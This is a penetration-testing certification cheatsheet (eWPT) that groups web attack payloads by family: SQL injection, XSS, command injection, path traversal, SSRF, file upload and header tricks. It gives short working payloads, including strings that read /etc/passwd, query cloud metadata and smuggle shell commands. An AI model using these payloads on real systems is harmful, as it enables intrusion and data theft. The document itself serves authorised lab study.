# Web Payloads — Families & Context Rules

> eWPT · Cheatsheets — INE-Cybersecurity-Certifications-Guide

## Purpose

A quick-reference map of **payload families** organized by vulnerability class.
It teaches *families and the rules for choosing them* — the archetype, when it
applies, and what success looks like — rather than thousands of copy-paste
lines. Learn the pattern, then adapt it to the target's syntax and filters.

Universal rules before any payload:

1. **Understand the sink.** Payloads target the *server-side context*: a SQL
   query, an OS command, a file path, an HTML parser, a URL fetch.
2. **Probe smallest first.** One character (`'`, `"`, `;`, `../`) often tells
   you more than a full exploit chain.
3. **Watch the response.** Status, length, echoed content, timing, and errors
   are your oracles. Always compare against a benign baseline request.
4. **Only authorized targets.** Every family below is disruptive; keep them in
   your labs.

## 1. SQL injection (SQLi)

### Union-based

Goal: append a `UNION SELECT` so your row set merges with the original query
and appears in the page. Match the original column count and data types; the
query's columns determine which positions are visible.

```sql
' ORDER BY 1-- -            -- find column count (increment until error)
' UNION SELECT 1,2,3-- -    -- map visible columns
' UNION SELECT 1,user(),database(),4-- -
```

### Error-based

Goal: force the DBMS to echo data inside an error message (e.g., MySQL
`extractvalue`/`updatexml` misuse, or casting a subquery to an incompatible
type).

```sql
' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))-- -
```

### Blind — boolean

Goal: no data in the response, but a *conditionally different* page. Build an
oracle that returns true/false and binary-search answers.

```sql
' AND 1=1-- -     -- true  baseline
' AND 1=2-- -     -- false baseline
' AND SUBSTRING((SELECT user()),1,1)='a'-- -
```

### Blind — time-based

Goal: infer truth from delay when the page never changes (e.g., MySQL
`SLEEP`, MSSQL `WAITFOR DELAY`). Only needed when boolean blind fails.

```sql
' AND SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -
```

### Stacked queries & file/OS

Goal: run a second statement (requires multi-statement drivers) or reach the
filesystem/OS via the DBMS (see the sqlmap guide).

```sql
'; SELECT LOAD_FILE('/etc/passwd')-- -   -- MySQL FILE privilege
```

**Context rules:** the *comment* syntax depends on the DBMS (`-- -`,
`#`, `/* */`); string vs numeric parameters change quoting; parameterized
queries and WAFs change what the payload must look like. When in doubt, use a
tool like sqlmap to confirm and extract — but prove manually first.

## 2. Cross-Site Scripting (XSS)

Three delivery families — same payload syntax, different persistence:

- **Reflected** — payload appears only in your own request/response.
- **Stored** — payload is saved (profile, comment, message) and later served to
  other users. Highest impact of the three.
- **DOM-based** — payload never reaches the server; client-side JavaScript
  reads a source (URL fragment, `location`, `postMessage`) and writes it into
  a sink (`innerHTML`, `document.write`, `eval`).

Payload families:

```html
<script>alert(document.domain)</script>          <!-- classic proof -->
<img src=x onerror=alert(document.domain)>        <!-- works where <script> is filtered -->
"><svg onload=alert(document.domain)>             <!-- breaking out of an attribute -->
javascript:alert(document.domain)                 <!-- in href/src contexts -->
```

**Context rules:** where your input lands decides the payload — an HTML element
(tags work), an attribute (break out with `"` first), a JavaScript string
(break out with `'`), or a URL. Test the context, then pick the shortest proof.
For DOM XSS, trace source→sink flows in the page's JavaScript: the payload may
be harmless over curl but fire in a real browser — always verify there.

## 3. Command injection

Goal: get your input interpreted by an OS shell. Separators — try them in
order; the app's shell and filters decide which works:

```bash
; whoami        # statement separator (works broadly)
| whoami        # pipe, often unfiltered
&& whoami       # AND — only if the first command succeeds
|| whoami       # OR — runs when the first command fails
`whoami`        # command substitution (unquoted context)
$(whoami)       # POSIX substitution
```

**Context rules:** figure out whether your input is inside a quoted argument —
if the app runs `ping <ip>`, you must break out of quotes first; blind command
execution needs an out-of-band channel (DNS/HTTP callback) or a time-based
probe (`sleep 5`). Prefer output-echoing proofs in labs.

## 4. Path traversal / LFI

Goal: read files outside the intended directory by manipulating the path.

```text
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd        # encoded slashes
....//....//etc/passwd             # naive filter bypass (double-encoding style)
/etc/passwd                        # absolute path when allowed
```

PHP LFI often rides on `include`/`require` of a parameter; the read may be
wrapped (e.g., `php://filter` for source):

```text
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=config.php
```

**Context rules:** URL-encode once, and twice if one decode happens; normalize
`..` variants when a filter strips one occurrence; know whether the app
prepends a directory or appends an extension (that determines whether a null
byte-style trick or wrapper applies — mostly historical on modern PHP). On
Windows, try `..\..\..\windows\win.ini`.

## 5. SSRF probes

Goal: make the *server* fetch an attacker-chosen URL. Probe with a URL you
control per class of target:

```text
http://127.0.0.1:22                 # local port probe
http://169.254.169.254/latest/meta-data/   # cloud metadata (AWS)
file:///etc/passwd                  # file scheme (some stacks)
gopher://127.0.0.1:3306/_           # tunneling to internal protocols
http://<your-callback>/             # out-of-band confirmation
```

**Context rules:** SSRF lives where the app fetches URLs (imports, webhooks,
PDF renderers). The response may render content (full) or only signal
success/failure (blind) — use status codes, timing, and callbacks as oracles.
Redirects can bypass host-allowlists; never probe metadata addresses outside
your authorized lab.

## 6. File upload

Goal: get an attacker-controlled file stored *and* executed or interpreted by
the server. Families and their rules:

```text
shell.php          # direct — blocked by most extension filters
shell.php.jpg      # double extension — depends on server config
shell.pHp          # case tricks against case-sensitive filters
shell.php%00.jpg   # legacy null-byte (historical PHP)
shell.php.          # trailing dot/space trimming on some servers
.svg with <script> # stored XSS via uploaded image-type files
```

**Context rules:** the game is *extension + content + location*: what the
server checks (extension allowlist, MIME type, magic bytes, image re-encode)
and where the file lands (web root = executable, uploads-only = stored XSS at
best). Prove execution by requesting the file; double extensions and MIME
sniffing behave differently per server — test your lab's configuration.

## 7. Request & header tricks

- **HTTP method override** — some frameworks honor `X-HTTP-Method-Override`
  or `_method` parameters; useful when a WAF only inspects the visible method.
- **Header injection / host tricks** — values like `X-Forwarded-Host`,
  `X-Forwarded-For`, `Referer` can change routing, caching, or password-reset
  links; test whether the app trusts them.
- **Duplicate parameters** — `?id=1&id=2`: the first, last, or concatenated
  value may win depending on stack; great for bypassing naive per-parameter
  checks.
- **Case and encoding normalization** — `?ID=1`, `%69d`, or Unicode lookalikes
  can dodge exact-match filters while reaching the same handler.
- **CRLF / null-byte tricks** — injecting `%0d%0a` into headers or `%00` into
  paths is largely mitigated on modern servers; test them as checks, and learn
  *why* they stopped working, rather than expecting a win.

**Context rules:** every trick answers the question "what does this stack
normalize, and what does the filter fail to normalize?" Test each one against a
known-good request and diff the response; if nothing changes, the app does not
trust that input — move on.

## Common mistakes & tips

- **Blindly pasting payload lists** → you never learn why one works. Start
  with the minimal probe for the family, then extend.
- **Ignoring the baseline** → you cannot read an oracle without a normal
  response to compare against. Capture it first.
- **Wrong context** → an XSS payload for an HTML element will not fire inside a
  JavaScript string; a SQLi payload for a numeric context breaks in a string
  context. Identify the context before choosing the family.
- **Stopping at the first success** → one working payload does not map the
  class. Try the *alternative* families too (error vs blind vs union).
- **Encoding confusion** → double-encoding, HTML entities, and URL encoding are
  not interchangeable; count how many times the stack decodes.
- **Testing destructive variants outside labs** → `OR 1=1`, `DROP`, and
  time-based payloads have real side effects. Read-only and reversible probes
  belong on real engagements.
- Tip: build a one-page personal matrix: *context → probe → expected oracle*.
  That matrix is worth more than any downloaded payload list.
- Tip: validate every payload family in DVWA at Low first, then watch it fail
  at High — the *why* of the failure teaches the defense.

## Checklist / Self-test

- [ ] I can name the three SQLi sub-families and when to use each.
- [ ] I can distinguish reflected, stored, and DOM XSS by delivery, not syntax.
- [ ] I know the order in which to try command-separator payloads and why.
- [ ] I can list three encodings of `../` and when each is needed.
- [ ] I can describe an SSRF test without ever touching a real cloud account.
- [ ] I know the difference between extension checks, MIME checks, and content checks.
- [ ] I can explain why duplicate parameters bypass some filters.
- [ ] Every family above has at least one working probe in my own lab.

---

## Further resources

- OWASP Cheat Sheet Series (payload/defense context) — <https://cheatsheetseries.owasp.org/>
- PortSwigger Web Security Academy (each class has free labs) — <https://portswigger.net/web-security>
- PayloadsAllTheThings community reference — <https://github.com/swisskyrepo/PayloadsAllTheThings>
- sqlmap tamper scripts reference — <https://github.com/sqlmapproject/sqlmap/tree/master/tamper>
